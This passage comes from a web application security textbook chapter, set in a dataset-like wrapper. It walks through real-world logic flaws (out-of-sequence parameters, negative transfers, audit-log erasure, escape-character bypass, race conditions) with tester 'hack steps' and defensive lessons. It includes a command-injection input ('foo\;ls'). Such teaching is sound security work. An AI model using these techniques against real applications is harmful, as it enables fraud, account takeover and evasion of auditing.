name/value pairs,\nand updated its state information with each item of data received.\nThe Assumption\nThe component which processed user-supplied data assumed that each\nrequest would contain only the parameters that had been requested from the\n70779c11.qxd:WileyRed 9/14/07 3:14 PM Page 355\nChapter 11 ■ Attacking Application Logic 355\nuser in the relevant HTML form. Developers did not consider what would\nhappen if a user submitted parameters that they had not been asked to supply.\nThe Attack\nOf course, the assumption was flawed, because users can submit arbitrary\nparameter names and values with every request. As a result, the core func-\ntionality of the application was broken in various ways:\n■■ An attacker could exploit the shared component to bypass all server-\nside input validation. At each stage of the quotation process, the appli-\ncation performed strict validation of the data expected at that stage, and\nrejected any data that failed this validation. But the shared component\nupdated the application’s state with every parameter supplied by the\nuser. Hence, if an attacker submitted data out of sequence, by supply-\ning a name/value pair which the application expected at an earlier\nstage, then that data would be accepted and processed, with no valida-\ntion having been performed. As it happened, this possibility paved the\nway for a stored cross-site scripting attack targeting the underwriter,\nwhich allowed a malicious user to access the personal information\nbelonging to other applicants (see Chapter 12).\n■■ An attacker could buy insurance at an arbitrary price. At the first stage\nof the quotation process, the applicant specified either their preferred\nmonthly premium or the value they wished to insure, and the applica-\ntion computed the other item accordingly. However, if a user supplied\nnew values for either or both of these items at a later stage, then the\napplication’s state was updated with these values. By submitting these\nparameters out of sequence, an attacker could obtain a quotation for\ninsurance at an arbitrary value and arbitrary monthly premium.\n■■ There were no access controls regarding which parameters a given\ntype of user could supply. When an underwriter reviewed a completed\napplication, they updated various items of data, including the accep-\ntance decision. This data was processed by the shared component in\nthe same way as for data supplied by an ordinary user. If an attacker\nknew or guessed the parameter names used when the underwriter\nreviewed an application, then the attacker could simply submit\nthese, thereby accepting their own application without any actual\nunderwriting.\n70779c11.qxd:WileyRed 9/14/07 3:14 PM Page 356\n356 Chapter 11 ■ Attacking Application Logic\nHACK STEPS\nThe flaws in this application were absolutely fundamental to its security, but\nnone of them would have been identified by an attacker who simply\nintercepted browser requests and modified the parameter values being\nsubmitted.\n■ Whenever an application implements a key action across multiple stages,\nyou should take parameters that are submitted at one stage of the\nprocess, and try submitting these to a different stage. If the relevant\nitems of data are updated within the application’s state, you should\nexplore the ramifications of this behavior, to determine whether you can\nleverage it to carry out any malicious action, as in the preceding three\nexamples.\n■ If the application implements functionality whereby different categories\nof user can update or perform other actions on a common collection of\ndata, you should walk through the process using each type of user and\nobserve the parameters submitted. Where different parameters are ordi-\nnarily submitted by the different users, take each parameter submitted\nby one user and try to submit this as the other user. If the parameter is\naccepted and processed as that user, explore the implications of this\nbehavior as previously described.\nExample 4: Breaking the Bank\nThe authors encountered this logic flaw in the web application deployed by a\nmajor financial services company.\nThe Functionality\nThe application enabled existing customers who did not already use the online\napplication to register to do so. New users were required to supply some basic\npersonal information, to provide a degree of assurance of their identity. This\ninformation included name, address, and date of birth, but did not include\nanything secret such as an existing password or PIN number.\nWhen this information had been correctly entered, the application for-\nwarded the registration request to back-end systems for processing. An infor-\nmation pack was mailed to the user’s registered home address. This pack\nincluded instructions for activating their online access via a telephone call to\nthe company’s call center and also a one-time password to use when first log-\nging in to the application.\n70779c11.qxd:WileyRed 9/14/07 3:14 PM Page 357\nChapter 11 ■ Attacking Application Logic 357\nThe Assumption\nThe application’s designers believed that this mechanism provided a very\nrobust defense against unauthorized access to the application. The mechanism\nimplemented three layers of protection:\n■■ A modest amount of personal data was required up front, to deter a\nmalicious attacker or mischievous user from attempting to initiate the\nregistration process on other users’ behalf.\n■■ The process involved transmitting a key secret out-of-band to the cus-\ntomer’s registered home address. Any attacker would need to have\naccess to the victim’s personal mail.\n■■ The customer was required to telephone the call center and authenticate\nhimself there in the usual way, based on personal information and\nselected digits from a PIN number.\nThis design was indeed robust. The logic flaw lay in the actual implementa-\ntion of the mechanism.\nThe developers implementing the registration mechanism needed a way to\nstore the personal data submitted by the user and correlate this with a unique\ncustomer identity within the company’s database. Keen to reuse existing code,\nthey came across the following class, which appeared to serve their purposes:\nclass CCustomer\n{\nString firstName;\nString lastName;\nCDoB dob;\nCAddress homeAddress;\nlong custNumber;\n...\nAfter the user’s information was captured, this object was instantiated, pop-\nulated with the supplied information, and stored in the user’s session. The\napplication then verified the user’s details, and if they were valid, retrieved\nthat user’s unique customer number, which was used in all of the company’s\nsystems. This number was added to the object, together with some other use-\nful information about the user. The object was then transmitted to the relevant\nback-end system for the registration request to be processed.\nThe developers assumed that making use of this code component was\nharmless and would not lead to any security problem. However, the assump-\ntion was flawed, with serious consequences.\n70779c11.qxd:WileyRed 9/14/07 3:14 PM Page 358\n358 Chapter 11 ■ Attacking Application Logic\nThe Attack\nThe same code component that was incorporated into the registration func-\ntionality was also used elsewhere within the application, including within the\ncore functionality, which gave authenticated users access to account details,\nstatements, funds transfers, and other information. When a registered user\nsuccessfully authenticated herself to the application, this same object was\ninstantiated and saved in her session to store key information about her iden-\ntity. The majority of the functionality within the application referenced the\ninformation within this object in order to carry out its actions—for example,\nthe account details presented to the user on her main page were generated on\nthe basis of the unique customer number contained within this object.\nThe way in the code component was already being employed within the\napplication meant that the developers’ assumption was flawed, and the man-\nner in which they reused it did indeed open up a significant vulnerability.\nAlthough the vulnerability was serious, it was in fact relatively subtle to\ndetect and exploit. Access to the main application functionality was protected\nby access controls at several layers, and a user needed to have a fully authen-\nticated session to pass these controls. To exploit the logic flaw, therefore, an\nattacker needed to perform the following steps:\n■■ Log in to the application using his own valid account credentials.\n■■ Using the resulting authenticated session, access the registration func-\ntionality and submit a different customer’s personal information. This\ncauses the application to overwrite the original CCustomerobject in the\nattacker’s session with a new object relating to the targeted customer.\n■■ Return to the main application functionality and access the other cus-\ntomer’s account.\nA vulnerability of this kind is not straightforward to detect when probing\nthe application from a black-box perspective. However, it is also hard to iden-\ntify when reviewing or writing the actual source code. Without a clear under-\nstanding of the application as a whole and the use made of different\ncomponents in different areas, the flawed assumption made by developers\nmay not be evident. Of course, clearly commented source code and design\ndocumentation would reduce the likelihood of such a defect being introduced\nor remaining undetected.\n70779c11.qxd:WileyRed 9/14/07 3:14 PM Page 359\nChapter 11 ■ Attacking Application Logic 359\nHACK STEPS\n■ In a complex application involving either horizontal or vertical privilege\nsegregation, try to locate any instances where an individual user can\naccumulate an amount of state within their session which relates in\nsome way to their identity.\n■ Try to step through one area of functionality, and then switch altogether\nto an unrelated area, to determine whether any accumulated state infor-\nmation has an effect on the application’s behavior.\nExample 5: Erasing an Audit Trail\nThe authors encountered this logic flaw in a web application used in a call center.\nThe Functionality\nThe application implemented various functions enabling helpdesk personnel\nand administrators to support and manage a large user base. Many of these\nfunctions were security-sensitive, including the creation of accounts and the\nresetting of passwords. Hence, the application maintained a full audit trail,\nrecording every action performed and the identity of the user responsible.\nThe application included a function allowing administrators to delete audit\ntrail entries. However to protect this function from being maliciously exploited,\nany use of the function was itself recorded, so the audit trail would indicate the\nidentity of the user responsible.\nThe Assumption\nThe designers of the application believed that it would be impossible for a\nmalicious user to perform an undesirable action without leaving some evi-\ndence in the audit trail that would link them to the action. An attempt by an\nadministrator to cleanse the audit logs altogether would always leave one last\nentry that would point the finger of suspicion at them.\nThe Attack\nThe designers’ assumption was flawed, and it was possible for a malicious\nadministrative user to carry out arbitrary actions without leaving any\n70779c11.qxd:WileyRed 9/14/07 3:14 PM Page 360\n360 Chapter 11 ■ Attacking Application Logic\nevidence within the audit trail that could identify them as responsible. The\nsteps required are:\n1. Log in using your own account, and create a second user account.\n2. Assign all of your privileges to the new account.\n3. Use the new account to perform a malicious action of your choice.\n4. Use the new account to delete all of the audit log entries generated by\nthe first three steps.\nEach of these actions generates entries in the audit log. However, in the last\nstep, the attacker deletes all of the entries created by the preceding actions. The\naudit log now contains a single suspicious entry, indicating that some log\nentries were deleted by a specific user—that is, by the new user account that\nwas created by the attacker. However, because the previous log entries have\nbeen deleted, there is nothing in the logs to link the attacker to anything sus-\npicious. The perfect crime.\nNOTE This type of flaw can also be found in some security models that\nrequire dual authorization for security-critical actions. If an attacker can create\na new account and use it to provide secondary authorization for a malicious\naction that he performs, then the additional defense provided by the model can\nbe trivially circumvented.\nIt is also worth noting that even without the facility to delete audit trail\nentries, the ability to create other powerful user accounts may make audit trails\ndifficult to follow, potentially requiring a large number of entries to be traced\nthrough to identify a perpetrator.\nExample 6: Beating a Business Limit\nThe authors encountered this logic flaw in a web-based enterprise resource\nplanning application used within a manufacturing company.\nThe Functionality\nFinance personnel had the facility to perform funds transfers between various\nbank accounts owned by the company and their key customers and suppliers.\nAs a precaution against fraud, the application prevented most users from pro-\ncessing transfers with a value greater than $10,000. Any transfer larger than\nthis required a senior manager’s approval.\n70779c11.qxd:WileyRed 9/14/07 3:14 PM Page 361\nChapter 11 ■ Attacking Application Logic 361\nThe Assumption\nThe code responsible for implementing this check within the application was\nextremely simple:\nbool CAuthCheck::RequiresApproval(int amount)\n{\nif (amount <= m_apprThreshold)\nreturn false;\nelse return true;\n}\nThe developer assumed that this transparent check was bulletproof. No\ntransaction for greater than the configured threshold could ever escape the\nrequirement for secondary approval.\nThe Attack\nThe developer’s assumption was flawed because he had completely over-\nlooked the possibility that a user would attempt to process a transfer for a neg-\native amount. Any negative number will clear the approval test, because it is\nless than the threshold. However, the banking module of the application\naccepted negative transfers and simply processed them as positive transfers in\nthe opposite direction. Hence, any user wishing to transfer $20,000 from\naccount A to account B could simply initiate a transfer of -$20,000 from account\nB to account A, which had the same effect and required no approval. The anti-\nfraud defenses built into the application could be trivially bypassed!\nNOTE Many kinds of web applications employ numeric limits within their\nbusiness logic. For example:\n■■ A retailing application may prevent a user from ordering more than the\nnumber of units available in stock.\n■■ A banking application may prevent a user from making bill payments\nthat exceed her current account balance.\n■■ An insurance application may adjust its quotations based on age\nthresholds.\nFinding a means of beating such limits will often not represent a security\ncompromise of the application itself. However it may have serious business\nconsequences and represent a breach of the controls that the owner is relying\non the application to enforce.\n70779c11.qxd:WileyRed 9/14/07 3:14 PM Page 362\n362 Chapter 11 ■ Attacking Application Logic\nThe most obvious vulnerabilities of this kind will often be detected during the\nuser-acceptance testing that normally occurs before an application is launched.\nHowever, more subtle manifestations of the problem may remain, particularly\nwhen hidden parameters are being manipulated.\nHACK STEPS\nThe first step in attempting to beat a business limit is to understand what\ncharacters are accepted within the relevant input which you control.\n■ Try entering negative values and see if these are accepted by the applica-\ntion and processed in the way that you would expect.\n■ You may need to perform several steps in order to engineer a change in\nthe application’s state that can be exploited for a useful purpose. For\nexample, several transfers between accounts may be required until a\nsuitable balance has been accrued that can actually be extracted.\nExample 7: Cheating on Bulk Discounts\nThe authors encountered this logic flaw in the retail application of a software\nvendor.\nThe Functionality\nThe application allowed users to order software products and qualify for bulk\ndiscounts if a suitable bundle of items was purchased. For example, users who\npurchased an antivirus solution, personal firewall, and anti-spam software\nwere entitled to a 25% discount on their individual prices.\nThe Assumption\nWhen a user added an item of software to his shopping basket, the application\nused various rules to determine whether the bundle of purchases he had cho-\nsen entitled him to any discount. If so, the prices of the relevant items within\nthe shopping basket were adjusted in line with the discount. The developers\nassumed that the user would go on to purchase the chosen bundle and so be\nentitled to the discount.\nThe Attack\nThe developers’ assumption is rather obviously flawed and ignores the fact\nthat users may remove items from their shopping baskets after they have been\n70779c11.qxd:WileyRed 9/14/07 3:14 PM Page 363\nChapter 11 ■ Attacking Application Logic 363\nadded. A crafty user could add to his basket large quantities of every single\nproduct on sale from the vendor, to attract the maximum possible bulk dis-\ncounts. When the discounts had been applied to items in the shopping basket,\nhe could remove items he did not require and still receive the discounts\napplied to the remaining products.\nHACK STEPS\n■ In any situation where prices or other sensitive values are adjusted\nbased on criteria that are determined by user-controllable data or\nactions, first understand the algorithms used by the application, and the\npoint within its logic where adjustments are made. Identify whether\nthese adjustments are made on a one-time basis or whether they are\nrevised in response to further actions performed by the user.\n■ Think imaginatively, and try to find a way of manipulating the applica-\ntion’s behavior to cause it to get into a state where the adjustments it\nhas applied do not correspond to the original criteria intended by its\ndesigners. In the most obvious case, as just described, this may simply\ninvolve removing items from a shopping cart after a discount has been\napplied!\nExample 8: Escaping from Escaping\nThe authors encountered this logic flaw in various web applications, including\nthe web administration interface used by a network intrusion detection product.\nThe Functionality\nThe application’s designers had decided to implement some functionality that\ninvolved passing user-controllable input as an argument to an operating sys-\ntem command. The application’s developers understood the inherent risks\ninvolved in this kind of operation (see Chapter 9) and decided to defend\nagainst these risks by sanitizing any potentially malicious characters within\nthe user input. Any instance of the following would be escaped using the back-\nslash character:\n; | & < > ` space and newline\nEscaping data in this way causes the shell command interpreter to treat the\nrelevant characters as part of the argument being passed to the invoked com-\nmand, rather than as shell metacharacters that could be used to inject addi-\ntional commands or arguments, redirect output, and so on.\n70779c11.qxd:WileyRed 9/14/07 3:14 PM Page 364\n364 Chapter 11 ■ Attacking Application Logic\nThe Assumption\nThe developers were certain that they had devised a robust defense against\ncommand injection attacks. They had brainstormed every possible character\nthat might assist an attacker, and had ensured that they were all properly\nescaped and therefore made safe.\nThe Attack\nThe developers forgot to escape the escape character itself.\nThe backslash character is not normally of direct use to an attacker when\nexploiting a simple command injection flaw, and so the developers did not\nidentify it as potentially malicious. However, by failing to escape it, they pro-\nvide a means for the attacker to defeat their sanitizing mechanism altogether.\nSuppose an attacker supplies the following input to the vulnerable function:\nfoo\\;ls\nThe application applies the relevant escaping, as described previously, and\nso the attacker’s input becomes:\nfoo\\\\;ls\nWhen this data is passed as an argument to the operating system command,\nthe shell interpreter treats the first backslash as the escape character, and so\ntreats the second backslash as a literal backslash—not an escape character but\npart of the argument itself. It then encounters a semicolon that is apparently\nnot escaped. It treats this as a command separator and so goes on to execute\nthe injected command supplied by the attacker.\nHACK STEPS\nWhenever you are probing an application for command injection and other\nflaws, having attempted to insert the relevant metacharacters into the data you\ncontrol, always try placing a backslash immediately before each such character,\nto test for the logic flaw described previously.\nNOTE This same flaw can be found in some defenses against cross-site\nscripting attacks (see Chapter 12). When user-supplied input is copied directly\ninto the value of a string variable in a piece of JavaScript, this value is\nencapsulated within quotation marks. To defend themselves against XSS, many\napplications use backslashes to escape any quotation marks that appear within\nthe user’s input. However, if the backslash character itself is not escaped, then\nan attacker can submit \\‘to break out of the string and so take control of the\nscript. This exact bug was found in early versions of the Ruby On Rails\nframework, in the escape_javascriptfunction.\n70779c11.qxd:WileyRed 9/14/07 3:14 PM Page 365\nChapter 11 ■ Attacking Application Logic 365\nExample 9: Abusing a Search Function\nThe authors encountered this logic flaw in an application providing subscription-\nbased access to financial news and information. The same vulnerability was later\nfound in two completely unrelated applications, illustrating the subtle and per-\nvasive nature of many logic flaws.\nThe Functionality\nThe application provided access to a huge archive of historical and current\ninformation, including company reports and accounts, press releases, market\nanalyses, and the like. Most of this information was accessible only to paying\nsubscribers.\nThe application provided a powerful and fine-grained search function,\nwhich could be accessed by all users. When an anonymous user performed\na query, the search function returned links to all documents that matched the\nquery. However, the user would be required to subscribe in order to retrieve\nany of the actual protected documents that their query returned. The applica-\ntion’s owners regarded this behavior as a useful marketing tactic.\nThe Assumption\nThe application’s designer assumed that users could not use the search func-\ntion to extract any useful information without paying for it. The document\ntitles listed in the search results were typically cryptic—for example, “Annual\nResults 2006,” “Press Release 08-03-2007,” and so on.\nThe Attack\nBecause the search function indicated the number of documents that matched\na given query, a wily user could issue a large number of queries and use infer-\nence to extract information from the search function that would normally need\nto be paid for. For example, the following queries could be used to zero in on\nthe contents of an individual protected document:\nwahh consulting\n>> 276 matches\nwahh consulting “Press Release 08-03-2007” merger\n>> 0 matches\nwahh consulting “Press Release 08-03-2007” share issue\n>> 0 matches\nwahh consulting “Press Release 08-03-2007” dividend\n>> 0 matches\nwahh consulting “Press Release 08-03-2007” takeover\n>> 1 match\n70779c11.qxd:WileyRed 9/14/07 3:14 PM Page 366\n366 Chapter 11 ■ Attacking Application Logic\nwahh consulting “Press Release 08-03-2007” takeover haxors inc\n>> 0 matches\nwahh consulting “Press Release 08-03-2007” takeover uberleet ltd\n>> 0 matches\nwahh consulting “Press Release 08-03-2007” takeover script kiddy corp\n>> 0 matches\nwahh consulting “Press Release 08-03-2007” takeover ngs\n>> 1 match\nwahh consulting “Press Release 08-03-2007” takeover ngs announced\n>> 0 matches\nwahh consulting “Press Release 08-03-2007” takeover ngs cancelled\n>> 0 matches\nwahh consulting “Press Release 08-03-2007” takeover ngs completed\n>> 1 match\nAlthough the user cannot view the actual document itself, with sufficient\nimagination and use of scripted requests, he may be able to build up a fairly\naccurate understanding of its contents.\nTIP In certain situations, an ability to leach information via a search function\nin this way may be critical to the security of the application itself—effectively\ndisclosing details of administrative functions, passwords, and technologies\nin use.\nExample 10: Snarfing Debug Messages\nThe authors encountered this logic flaw in a web application used by a finan-\ncial services company.\nThe Functionality\nThe application was only recently deployed and like much new software still\ncontained a number of functionality-related bugs. Intermittently, various oper-\nations would fail in an unpredictable way, and users would be presented with\nan error message.\nTo facilitate the investigation of errors, developers decided to include\ndetailed verbose information in these messages, including the following\ndetails:\n■■ The user’s identity.\n■■ The token for the current session.\n■■ The URL being accessed.\n■■ All of the parameters supplied with the request which generated the\nerror.\n70779c11.qxd:WileyRed 9/14/07 3:14 PM Page 367\nChapter 11 ■ Attacking Application Logic 367\nGenerating these messages had proved useful when helpdesk personnel\nattempted to investigate and recover from system failures, and were helping to\niron out the remaining functionality bugs.\nThe Assumption\nDespite the usual warnings from security advisers that verbose debug mes-\nsages of this kind could potentially be misused by an attacker, the developers\nreasoned that they were not opening up any security vulnerability. All of the\ninformation contained within the debugging message could be readily\nobtained by the user, by inspecting the requests and responses processed by\nher browser. The messages did not include any details about the actual failure,\nsuch as stack traces, and so could not conceivably assist in formulating an\nattack against the application.\nThe Attack\nDespite their reasoning about the contents of the debug messages, the devel-\nopers’ assumption was flawed because of mistakes they made in implement-\ning the creation of debugging messages.\nWhen an error occurred, a component of the application gathered all of the\nrequired information and stored it. The user was issued with an HTTP redirect\nto a URL that displayed this stored information. The problem was that the\napplication’s storage of debug information, and user access to the error mes-\nsage, was not session-based. Rather, the debugging information was stored in\na static container, and the error message URL always displayed the informa-\ntion which was last placed into this container. Developers had assumed that\nusers following the redirect would, therefore, see only the debug information\nrelating to their error.\nIn fact, in this situation, ordinary users would occasionally be presented\nwith the debugging information relating to a different user’s error, because the\ntwo errors had occurred almost simultaneously. But aside from questions\nabout thread safety (see the next example), this was not simply a race condi-\ntion. An attacker who discovered the way in which the error mechanism func-\ntioned could simply poll the message URL repeatedly, and log the results each\ntime they changed. Over a period of few hours, this log would contain sensi-\ntive data about numerous application users:\n■■ A set of usernames that could be used in a password-guessing attack.\n■■ A set of session tokens that could be used to hijack sessions.\n■■ A set of user-supplied input, which may contain passwords and other\nsensitive items.\n70779c11.qxd:WileyRed 9/14/07 3:14 PM Page 368\n368 Chapter 11 ■ Attacking Application Logic\nThe error mechanism, therefore, presented a critical security threat. Because\nadministrative users sometimes received these detailed error messages, an\nattacker monitoring error messages would soon obtain sufficient information\nto compromise the entire application.\nHACK STEPS\n■ To detect a flaw of this kind, first catalog all of the anomalous events and\nconditions that can be generated and that involve interesting user-spe-\ncific information being returned to the browser in an unusual way, such\nas a debugging error message.\n■ Using the application as two users in parallel, systematically engineer\neach condition using one or both users, and determine whether the other\nuser is affected in each case.\nExample 11: Racing against the Login\nThis logic flaw has affected several major applications in the recent past.\nThe Functionality\nThe application implemented a robust, multistage login process in which\nusers were required to supply several different credentials to gain access.\nThe Assumption\nThe authentication mechanism had been subject to numerous design reviews\nand penetration tests. The owners were confident that no feasible means\nexisted of attacking the mechanism to gain unauthorized access.\nThe Attack\nIn fact, the authentication mechanism contained a subtle flaw. Very occasion-\nally, when a customer logged in, he gained access to the account of a com-\npletely different user, enabling him to view all of that user’s financial details,\nand even make payments from the other user’s account. The application’s\nbehavior appeared initially to be completely random: the user had not per-\nformed any unusual action in order to gain unauthorized access, and the\nanomaly did not recur on subsequent logins.\nAfter some investigation, the bank discovered that the error was occurring\nwhen two different users logged in to the application at precisely the same\nmoment. It did not occur on every such occasion—only on a subset of them.\n70779c11.qxd:WileyRed 9/14/07 3:14 PM Page 369\nChapter 11 ■ Attacking Application Logic 369\nThe root cause was that the application was briefly storing a key identifier\nabout each newly authenticated user within a static (nonsession) variable.\nAfter being written, this variable’s value was read back an instant later. If a dif-\nferent thread (processing another login) had written to the variable during this\ninstant, the earlier user would land in an authenticated session belonging to\nthe subsequent user.\nThe vulnerability arose from the same kind of mistake as in the error mes-\nsage example described previously: the application was using static storage to\nhold information that ought to have been stored on a per-thread or per-session\nbasis. However, the present example is far more subtle to detect, and is more\ndifficult to exploit because it cannot be reliably reproduced.\nFlaws of this kind are known as “race conditions” because they involve a\nvulnerability that arises for a brief period of time during certain specific cir-\ncumstances. Because the vulnerability exists only for a short time, an attacker\nfaces a “race” to exploit it before the application closes it again. In cases where\nthe attacker is local to the application, it is often possible to engineer the exact\ncircumstances in which the race condition arises, and reliably exploit the vul-\nnerability during the available window. Where the attacker is remote to the\napplication, this is normally much harder to achieve.\nA remote attacker who understood the nature of the vulnerability could\nconceivably have devised an attack to exploit it, by using a script to log in con-\ntinuously and check the details of the account accessed. But the tiny window\nduring which the vulnerability could be exploited meant that a huge number\nof requests would be required.\nIt was not surprising that the race condition was not discovered during nor-\nmal penetration testing. The conditions in which it arose came about only when\nthe application gained a large enough user base for random anomalies to occur,\nwhich were reported by customers. However, a close code review of the authen-\ntication and session management logic would have identified the problem.\nHACK STEPS\nPerforming remote black-box testing for subtle thread safety issues of this kind\nis not straightforward and should be regarded as a specialized undertaking,\nprobably necessary only in the most security-critical of applications.\n■ Target selected items of key functionality, such as login mechanisms,\npassword change functions, and funds transfer processes.\n■ For each function tested, identify a single request, or a small number of\nrequests, that can be used by a given user to perform a single action.\nAlso find the simplest means of confirming the result of the action—for\nexample, verifying that a given user’s login has resulted in access to their\nown account information.\nContinued"
  },
  {
    "input": "Avoiding Logic Flaws",
    "output": "70779c11.qxd:WileyRed 9/14/07 3:14 PM Page 370\n370 Chapter 11 ■ Attacking Application Logic\nHACK STEPS (continued)\n■ Using several high-spec machines, accessing the application from differ-\nent network locations, script an attack to perform the same action\nrepeatedly on behalf of several different users. Confirm whether each\naction has the expected result.\n■ Be prepared for a large volume of false positives. Depending on the scale\nof the application’s supporting infrastructure, this activity may well\namount to a load test of the installation. Anomalies may be experienced\nfor reasons that have nothing to do with security.\nAvoiding Logic Flaws\nJust as there is no unique signature by which logic flaws in web applications\ncan be identified, there is also no silver bullet with which you can be protected.\nFor example, there is no equivalent to the straightforward advice of using a\nsafe alternative to a dangerous API. Nevertheless, there is a range of good\npractice that can be applied to significantly reduce the risk of logical flaws\nappearing within your applications:\n■■ Ensure that every aspect of the application’s design is clearly docu-\nmented in sufficient detail for an outsider to understand every assump-\ntion made by the designer. All such assumptions should be explicitly\nrecorded within the design documentation.\n■■ Mandate that all source code is clearly commented to include the fol-\nlowing information throughout:\n■■ The purpose and intended uses of each code component.\n■■ The assumptions made by each component about anything that is\noutside of its direct control.\n■■ References to all client code which makes use of the component.\nClear documentation to this effect could have prevented the logic\nflaw within the online registration functionality. (Note: “client” here\nrefers not to the user end of the client-server relationship but to\nother code for which the component being considered is an immedi-\nate dependency.)\n■■ During security-focused reviews of the application design, reflect upon\nevery assumption made within the design, and try to imagine circum-\nstances in which each assumption might be violated. Focus particularly\non any assumed conditions that could conceivably be within the control\nof application users.\n70779c11.qxd:WileyRed 9/14/07 3:14 PM Page 371\nChapter 11 ■ Attacking Application Logic 371\n■■ During security-focused code reviews, think laterally about two key\nareas: (a) the ways in which unexpected user behavior and input will be\nhandled by the application, and (b) the potential side effects of any\ndependencies and interoperation between different code components\nand different application functions.\nIn relation to the specific examples of logic flaws we have described, a num-\nber of individual lessons can be learned:\n■■ Be constantly aware that users control every aspect of every request\n(see Chapter 1). They may access multistage functions in any sequence.\nThey may submit parameters that the application did not ask for. They\nmay omit certain parameters altogether, not just interfere with the para-\nmeters’ values.\n■■ Drive all decisions regarding a user’s identity and status from her ses-\nsion (see Chapter 8). Do not make any assumptions about the user’s\nprivileges on the basis of any other feature of the request, including the\nfact that it occurs at all.\n■■ When implementing functions that update session data on the basis of\ninput received from the user, or actions performed by the user, reflect\ncarefully on any impact that the updated data may have on other func-\ntionality within the application. Be aware that unexpected side effects\nmay occur in entirely unrelated functionality written by a different pro-\ngrammer or even a different development team.\n■■ If a search function is liable to index sensitive data that some users are\nnot authorized to access, ensure that the function does not provide any\nmeans for those users to infer information based on search results. If\nappropriate, maintain several search indexes based on different levels\nof user privilege, or perform dynamic searches of information reposito-\nries with the privileges of the requesting user.\n■■ Be extremely wary of implementing any functionality that enables any\nuser to delete items from an audit trail. Also, consider the possible\nimpact of a high-privileged user creating another user of the same priv-\nilege in heavily audited applications and dual-authorization models.\n■■ When carrying out checks based on numeric business limits and thresh-\nolds, perform strict canonicalization and data validation on all user\ninput before processing it. If negative numbers are not expected, explic-\nitly reject requests that contain them.\n■■ When implementing discounts based on order volumes, ensure that\norders are finalized before actually applying the discount."
  },
  {
    "input": "Questions",
    "output": "70779c11.qxd:WileyRed 9/14/07 3:14 PM Page 372\n372 Chapter 11 ■ Attacking Application Logic\n■■ When escaping user-supplied data before passing to a potentially vul-\nnerable application component, always be sure to escape the escape\ncharacter itself, or the entire validation mechanism may be broken.\n■■ Always use appropriate storage to maintain any data that relates to an\nindividual user—either in the session or in the user’s profile.\nChapter Summary\nAttacking an application’s logic involves a mixture of systematic probing and\nlateral thinking. As we have identified, there are various key checks that you\nshould always carry out to test the application’s behavior in response to unex-\npected input. These include removing parameters from requests, using forced\nbrowsing to access functions out of sequence, and submitting parameters to\ndifferent locations within the application. Often, the way an application\nresponds to these actions will point towards some defective assumption that\nyou can violate, to malicious effect.\nIn addition to these basic tests, the most important challenge when probing\nfor logic flaws is to try to get inside the mind of the developer. You need to\nunderstand what they were trying to achieve, what assumptions they proba-\nbly made, what shortcuts they are likely to have taken, and what mistakes they\nmay have committed. Imagine that you were working to a tight deadline, wor-\nrying primarily about functionality rather than security, trying to add a new\nfunction to an existing code base, or using poorly documented APIs written by\nsomeone else. In that situation, what would you get wrong, and how could it\nbe exploited?\nQuestions\nAnswers can be found at www.wiley.com/go/webhacker.\n1. What is forced browsing, and what kind of vulnerabilities can it be\nused to identify?\n2. An application applies various global filters on user input, designed to\nprevent different categories of attack. To defend against SQL injection, it\ndoubles up any single quotation marks that appear in user input. To\nprevent buffer overflow attacks against some native code components,\nit truncates any overlong items to a reasonable limit.\nWhat might go wrong with these filters?\n70779c11.qxd:WileyRed 9/14/07 3:14 PM Page 373\nChapter 11 ■ Attacking Application Logic 373\n3. What steps could you take to probe a login function for fail-open condi-\ntions? (Describe as many different tests as you can think of.)\n4. A banking application implements a multistage login mechanism that is\nintended to be highly robust. At the first stage, the user enters a user-\nname and password. At the second stage, the user enters the changing\nvalue on a physical token that they possess, and the original username\nis resubmitted in a hidden form field.\nWhat logic flaw should you immediately check for?\n5. You are probing an application for common categories of vulnerability\nby submitting crafted input. Frequently, the application returns verbose\nerror messages containing debugging information. Occasionally, these\nmessages relate to errors generated by other users. When this happens,\nyou are unable to reproduce the behavior a second time. What logic\nflaw may this indicate, and how should you proceed?\n70779c11.qxd:WileyRed 9/14/07 3:14 PM Page 374"
  },
  {
    "input": "Chapter 12: Attacking Other Users",
    "output": "70779c12.qxd:WileyRed 9/14/07 3:14 PM Page 375\nCHAPTER\n12\nAttacking Other Users\nThe majority of interesting attacks against web applications involve targeting\nthe server-side application itself. Many of these attacks do of course impinge\nupon other users—for example, an SQL injection attack that steals other\nusers’ data. But the essential methodology of the attacker is to interact with the\nserver in unexpected ways in order to perform unauthorized actions and\naccess unauthorized data.\nThe attacks described in this chapter are in a different category, because the\nprimary target of the attacker is the application’s other users. All of the rele-\nvant vulnerabilities still exist within the server-side application. However, the\nattacker leverages some aspect of the application’s behavior in order to carry\nout malicious actions against another end user. These actions may result in\nsome of the same effects that we have already examined, such as session\nhijacking, unauthorized actions, and the disclosure of personal data. They may\nalso result in other undesirable outcomes, such as logging of keystrokes or exe-\ncution of arbitrary commands on users’ computers.\nOther areas of software security have witnessed a gradual shift in focus\nfrom server-side to client-side attacks in recent years. To take one example,\nMicrosoft used to announce serious security vulnerabilities within their server\nproducts on a frequent basis. Although numerous client-side flaws were also\ndisclosed, these received much less attention because servers presented a\nmuch more appealing target for most attackers. In just a few years, this situa-\ntion has changed markedly. At the time of this writing, no critical security\n375"
  },
  {
    "input": "Cross-Site Scripting",
    "output": "70779c12.qxd:WileyRed 9/14/07 3:14 PM Page 376\n376 Chapter 12 ■ Attacking Other Users\nvulnerabilities have been publicly announced in Microsoft’s IIS 6 web server.\nHowever, in the time since this product was first released, a very large number\nof flaws have been disclosed in Microsoft’s Internet Explorer browser. As the\ngeneral awareness of security threats has evolved, the front line of the battle\nbetween software developers and hackers has moved from the server to the\nclient.\nAlthough web application security is still some way behind the curve just\ndescribed, the same trend can be detected. A decade ago, most applications on\nthe Internet were riddled with critical flaws like command injection, which\ncould be easily found and exploited by any attacker with a bit of knowledge.\nAlthough many such vulnerabilities still exist today, they are slowly becoming\nless widespread and more difficult to exploit. Meanwhile, even the most\nsecurity-critical applications still contain many easily discoverable client-side\nflaws. A key focus of recent research has been on this kind of vulnerability,\nwith defects such as session fixation first being discussed many years after\nmost categories of server-side bugs were widely known about. Media focus on\nweb security is predominantly concerned with client-side attacks, with such\nterms as spyware, phishing, and Trojans being common currency to many\njournalists who have never heard of SQL injection or path traversal. And\nattacks against web application users are an increasingly lucrative criminal\nbusiness. Why go to the trouble of breaking into an Internet bank, when it has\n10 million customers and you can compromise 1% of these in a relatively crude\nattack that requires little skill or elegance?\nAttacks against other application users come in many forms and manifest a\nvariety of subtleties and nuances that are frequently overlooked. They are also\nless well understood in general than the primary server-side attacks, with dif-\nferent flaws being 